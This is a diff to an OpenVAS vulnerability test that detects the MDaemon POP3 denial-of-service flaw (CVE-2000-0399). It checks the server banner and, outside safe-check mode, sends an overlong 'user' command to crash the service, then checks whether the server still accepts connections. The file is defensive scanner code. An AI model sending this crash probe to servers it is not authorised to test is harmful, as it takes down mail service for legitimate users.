@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: mdaemon_mail_server_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
+# $Id: mdaemon_mail_server_dos.nasl 13077 2019-01-15 10:37:47Z cfischer $
 # Description: MDaemon mail server DoS
 #
 # Authors:
@@ -23,81 +23,79 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-tag_summary = "The remote host is running the MDaemon POP server.
-
-It is possible to crash the remote service by sending a too long 'user' 
-command. 
-
-This problem allows an attacker to make the remote MDaemon server crash, thus 
-preventing legitimate users from receiving e-mails.";
-
-tag_solution = "Upgrade to the newest version of this software";
-
 #  Ref: Cassius <cassius@hushmail.com>
 
 if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.14825");
- script_version("$Revision: 9348 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
- script_bugtraq_id(1250);
- script_tag(name:"cvss_base", value:"5.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
- script_xref(name:"OSVDB", value:"1354");
- script_cve_id("CVE-2000-0399");
- 
- name = "MDaemon mail server DoS";
- script_name(name);
- 
+  script_oid("1.3.6.1.4.1.25623.1.0.14825");
+  script_version("$Revision: 13077 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-15 11:37:47 +0100 (Tue, 15 Jan 2019) $");
+  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
+  script_bugtraq_id(1250);
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
+  script_xref(name:"OSVDB", value:"1354");
+  script_cve_id("CVE-2000-0399");
+  script_name("MDaemon POP3 server DoS");
+  script_category(ACT_MIXED_ATTACK);
+  script_copyright("This script is Copyright (C) 2004 David Maciejak");
+  script_family("Denial of Service");
+  script_dependencies("find_service2.nasl");
+  script_require_ports("Services/pop3", 110);
 
- 
- script_category(ACT_MIXED_ATTACK);
+  script_tag(name:"solution", value:"Upgrade to the newest version of this software.");
+
+  script_tag(name:"summary", value:"The remote host is running the MDaemon POP3 server.
+
+  It is possible to crash the remote service by sending a too long 'user' command.");
+
+  script_tag(name:"impact", value:"This problem allows an attacker to make the remote
+  MDaemon server crash, thus preventing legitimate users from receiving e-mails.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_banner");
-  
- script_copyright("This script is Copyright (C) 2004 David Maciejak");
- family = "Denial of Service";
- script_family(family);
- script_dependencies("find_service.nasl", "sendmail_expn.nasl");
- script_require_ports("Services/pop3", 110);
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+
+  exit(0);
 }
 
-#
-# The script code starts here
-#
 include("pop3_func.inc");
-port = get_kb_item("Services/pop3");
-if(!port)port = 110;
 
-if ( safe_checks() )
-{
- banner = get_pop3_banner (  port: port );
- if ( ! banner ) exit(0);
- if(ereg(pattern:".* POP MDaemon ([0-2]\.|0\.3\.[0-3][^0-9])", string:banner))
- 	security_message(port);
+port = get_pop3_port(default:110);
 
- exit(0);
+if(safe_checks()) {
+
+  banner = get_pop3_banner(port:port);
+  if(!banner || "MDaemon" >!< banner)
+    exit(0);
+
+  if(ereg(pattern:".* POP MDaemon ([0-2]\.|0\.3\.[0-3][^0-9])", string:banner))
+    security_message(port:port);
+  exit(0);
 }
 
-if(get_port_state(port))
-{
- soc = open_sock_tcp(port);
- if(soc)
- {
-  banner = recv_line(socket:soc, length:4096);
-  if ( "MDaemon" >!< banner ) exit(0);
-  s = string("user ", crap(256), "\r\n");
-  send(socket:soc, data:s);
-  d = recv_line(socket:soc, length:4096);
-  s = string("pass killyou\r\n");
-  send(socket:soc, data:s);
+soc = open_sock_tcp(port);
+if(!soc)
+  exit(0);
+
+banner = recv_line(socket:soc, length:4096);
+if(! banner || "MDaemon" >!< banner) {
   close(soc);
-  
-  soc2 = open_sock_tcp(port);
-  if(!soc2)security_message(port);
-  else close(soc2);
- }
+  exit(0);
 }
+
+s = string("user ", crap(256), "\r\n");
+send(socket:soc, data:s);
+d = recv_line(socket:soc, length:4096);
+s = string("pass vt-test\r\n");
+send(socket:soc, data:s);
+
+close(soc);
+
+soc2 = open_sock_tcp(port);
+if(!soc2) {
+  security_message(port:port);
+  exit(0);
+}
+
+close(soc2);
+exit(99);
